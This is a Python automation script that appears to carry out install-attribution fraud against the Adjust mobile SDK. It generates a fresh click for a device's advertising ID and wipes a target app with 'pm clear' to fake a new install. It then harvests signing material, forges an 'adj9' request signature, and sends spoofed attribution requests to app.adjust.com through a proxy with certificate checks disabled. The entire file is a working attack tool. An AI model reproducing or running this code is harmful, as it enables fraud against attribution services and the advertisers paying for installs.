# amc_final.py - ONE SHOT: fresh click on the CURRENT GAID -> pm clear ->
# piggy-mint during the fresh-install signing burst -> device verdict (the
# app's own A-path) -> M/C bracket sends from PC -> save everything.
import base64
import datetime as dt
import http.client
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.stdout.reconfigure(line_buffering=True)
import farm_win as fw
import sig_probe as sp
import adj9_full_chain as fc
import device_funnel as df

fc.DEV, fc.UA = dict(fc.MOTO), fc.MOTO_UA
fc.OFF_MINUTES, fc.OFF_LABEL = 330, "+0530"
OUT = os.path.join(HERE, "amc_final_result.json")
MINTED = os.path.join(HERE, "minted4.json")
res = {"phases": {}}


def phase(name, ok, detail=""):
    res["phases"][name] = {"ok": ok, "detail": detail}
    print("[%s] %s %s" % ("OK " if ok else "ERR", name, detail), flush=True)
    if not ok:
        json.dump(res, open(OUT, "w"), indent=1)
        raise SystemExit("phase failed: " + name)


# ---- 1. identity: GMS gaid (keep whatever is set; record it) --------------
gps = fw.get_gaid()
phase("gaid", bool(gps), "GAID=%s" % gps)

# ---- 2. fresh click on this identity --------------------------------------
code, ref, hops, curl = fw.fire_click(gps, "cline_amc3", None)
phase("click", 200 <= code < 400, "http=%s ref=%s" % (code, (ref or "")[:60]))

# ---- 3. fresh install burst: pm clear then mint4_run (it launches the app)
fw.su("pm clear com.penti.app") if hasattr(fw, "su") else None
os.system("adb shell pm clear com.penti.app")
before = os.path.getmtime(MINTED) if os.path.exists(MINTED) else 0
subprocess.run([sys.executable, "-X", "utf8",
                os.path.join(HERE, "mint4_run.py")], timeout=420)
time.sleep(1)
ok = os.path.exists(MINTED) and os.path.getmtime(MINTED) > before
M = json.load(open(MINTED)) if ok else {}
pairs = M.get("mapPairs") or []
val = {}
for k, v in pairs:
    val.setdefault(k, v)
phase("mint", ok and len(bytes.fromhex(M.get("blob_hex", ""))) == 192,
      "blob=%dB mint_gps=%s expected=%s match=%s"
      % (len(M.get("blob_hex", "")) // 2, val.get("gps_adid"), gps,
         val.get("gps_adid") == gps))


# ---- 4. bracket sends (funnel) -------------------------------------------
def send_auth(url, b, auth_value):
    pr = urllib.parse.urlsplit(url)
    path = pr.path + ("?" + pr.query if pr.query else "")
    conn = http.client.HTTPSConnection(pr.hostname, 443, timeout=30)
    conn.putrequest("GET", path, skip_host=1, skip_accept_encoding=1)
    conn.putheader("Client-SDK", "android5.7.0")
    conn.putheader("Authorization", auth_value)
    conn.putheader("User-Agent", fc.UA)
    conn.putheader("Host", pr.hostname)
    conn.putheader("Connection", "Keep-Alive")
    conn.putheader("Accept-Encoding", "gzip")
    conn.endheaders()
    r = conn.getresponse()
    body = r.read().decode("utf-8", "replace")
    conn.close()
    return r.status, body


df.install_proxy("http://127.0.0.1:8888")
os.environ["ADJ_INSECURE"] = "1"
blob = bytes.fromhex(M["blob_hex"])
auth = M["authorization"]
m_gps, auid = val["gps_adid"], val["android_uuid"]
q = {
    "gps_adid": m_gps, "android_uuid": auid,
    "gps_adid_src": val["gps_adid_src"], "gps_adid_attempt": val["gps_adid_attempt"],
    "api_level": val["api_level"], "app_version": val["app_version"],
    "app_token": val["app_token"], "os_name": val["os_name"],
    "os_version": val["os_version"], "device_name": val["device_name"],
    "device_type": val["device_type"], "environment": val["environment"],
    "package_name": val["package_name"], "created_at": val["created_at"],
    "sent_at": val["sent_at"], "installed_at": val["installed_at"],
    "updated_at": val["updated_at"], "session_count": val["session_count"],
    "tracking_enabled": val["tracking_enabled"], "initiated_by": "backend",
    "needs_response_details": val["needs_response_details"],
    "attribution_deeplink": val["attribution_deeplink"],
    "offline_mode_enabled": val["offline_mode_enabled"],
    "device_manufacturer": val["device_manufacturer"],
    "hardware_name": val["hardware_name"], "os_build": val["os_build"],
    "language": val["language"], "cpu_type": val["cpu_type"],
    "display_width": val["display_width"], "display_height": val["display_height"],
    "screen_size": val["screen_size"], "screen_format": val["screen_format"],
    "screen_density": val["screen_density"],
    "connectivity_type": val["connectivity_type"], "ui_mode": val["ui_mode"],
    "foreground": val["foreground"],
    "initiating_package_name": val["initiating_package_name"],
    "store_name_from_system": val["store_name_from_system"],
}
url = "https://app.adjust.com/attribution?" + urllib.parse.urlencode(q)
ca = re.match(r"(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})", val["created_at"])
created = dt.datetime(*map(int, ca.groups()), tzinfo=dt.timezone.utc)
sec = int(created.timestamp()) - 330 * 60
st, n, crafted = fc.make_signature(sec, val["created_at"].encode(), m_gps, auid,
                                   val["installed_at"].encode())
print("[crafted] status=%s steps=%s hdr=%s" % (st, n, crafted[:16].hex()),
      flush=True)
bracket = [("M minted device-keystore ours", blob, auth),
           ("C crafted maker control", crafted, None),
           ("M minted again (stability)", blob, auth)]
bracket_res = []
for label, b, a in bracket:
    if a is None:
        a = ('Signature signature="%s",adj_signing_id="1500000",'
             'algorithm="adj9",headers_id="10",native_version="5.0.0",'
             'adj_verification="KlcAG2cbAAsKSl1KVi0FGiJbDHMI"'
             % base64.b64encode(b).decode())
    try:
        s, body = send_auth(url, b, a)
        v = sp.verdict(s, body)
    except Exception as e:
        s, v = "ERR", "%s: %s" % (type(e).__name__, e)
    print("%-30s -> %s %s" % (label, s, v), flush=True)
    bracket_res.append({"label": label, "http": s, "verdict": v})
    time.sleep(3)
res["bracket"] = bracket_res
res["url"] = url

# ---- 5. device verdict: the app's own /attribution read ------------------
time.sleep(15)
attr = fw.su_file(fw.ATTR).decode("latin1", "replace")
m = re.search(r"network[^\x00]{0,10}(VKM|Organic)[^\x00]{0,40}", attr)
dv = m.group(0) if m else attr[:120]
res["device_verdict"] = dv
print("[device]", dv, flush=True)
json.dump(res, open(OUT, "w"), indent=1)
print("saved", OUT)
